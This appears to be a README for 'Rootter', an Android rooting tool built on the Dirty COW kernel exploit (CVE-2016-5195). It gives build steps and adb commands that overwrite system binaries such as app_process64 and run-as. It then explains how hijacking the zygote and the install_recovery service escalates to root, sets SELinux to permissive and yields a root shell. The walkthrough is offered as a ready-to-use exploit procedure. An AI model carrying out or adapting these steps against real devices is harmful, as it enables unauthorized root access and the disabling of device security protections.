# CVE-2016-5195
CVE-2016-5195 (dirty cow/dirtycow/dirtyc0w) proof of concept for Android

## Rootter, an exploit tool to root "secure" systems with **unlocked** bootloaders
## Based off of Jcadduono's recowvery project

## Usage:

### Building:
```sh
lunch your_device-eng

make -j5 dirtycow root-app_process64 root-run-as
```

### Running:
```sh
adb push dirtycow /data/local/tmp
adb push root-app_process64 /data/local/tmp
adb push root-run-as /data/local/tmp
adb push install_recovery.sh /data/local/tmp

adb shell

$ cd /data/local/tmp
$ chmod 0777 *
$ ./dirtycow /system/bin/install_recovery.sh install_recovery.sh
$ ./dirtycow /system/bin/app_process64 root-app_process64
"<wait for completion, your phone will look like it's crashing>"
$ exit

adb shell reboot recovery
"<wait for phone to boot up again, your recovery will be reflashed to stock>"

adb shell

$ getenforce
"<it should say Permissive, adjust source and build for your device!>"

$ cd /data/local/tmp
$ ./dirtycow /system/bin/run-as recowvery-run-as

$ run-as su
#
"<play around in your somewhat limited root shell full of possibilities>"
```

## How it works:

dirtycow manages to exploit an old bug in the copy-on-write code of the Linux kernel which can trick the system into running a different ELF executable in another "priveleged" executable's place.  
Don't quote me on that, I haven't researched it any more than I needed to.  

The `install_recovery.sh` script is a shell script which is run by init in the `u:r:install_recovery:s0` selinux domain.  
While this script is intended for replacing the recovery partition image with the OEM original (based on diff of boot partition) if it is damaged, we can abuse it to install our own recovery images.  

The `u:r:install_recovery:s0` is the only context in Android that is able to read and write to the recovery partition. It has access to only a few other items, however.  
It can run binaries in `/system/bin` under its context with limited permissions. (ex. `setenforce` for disabling/enabling selinux, and `sh` for running the `install_recovery.sh` shell script)  

We can't start the install\_recovery service ourselves, it needs to be run by init's service control. The `u:r:system_server:s0` context is capable of starting init services, so that's where root-app_process64 comes in handy.  
`/system/bin/app_process64` is a zygote executable. It brings up the Android framework and maintains it during system use.  

The `u:r:zygote:s0` context that app\_process64 starts in has permissions to transition to the `u:r:system_server:s0` context for when it brings up the system server.  
We can abuse that privelege by hijacking app\_process64 (which is run as root) with dirtycow and then transition to `u:r:system_server:s0` ourselves to start the install\_recovery service as root in the `u:r:install_recovery:s0` domain.  

We can now use dirtycow to replace the `/system/bin/run-as` execution with our own that is perfectly happy to elevate any command to root, as well as start a root shell for you.  
 
You should now be able to start your system in SELinux Permissive mode on every reboot, allowing you to use dirtycow and `run-as` to gain root access (in a shell) whenever you'd like.  

Hope you enjoyed the read, and have fun exploiting!
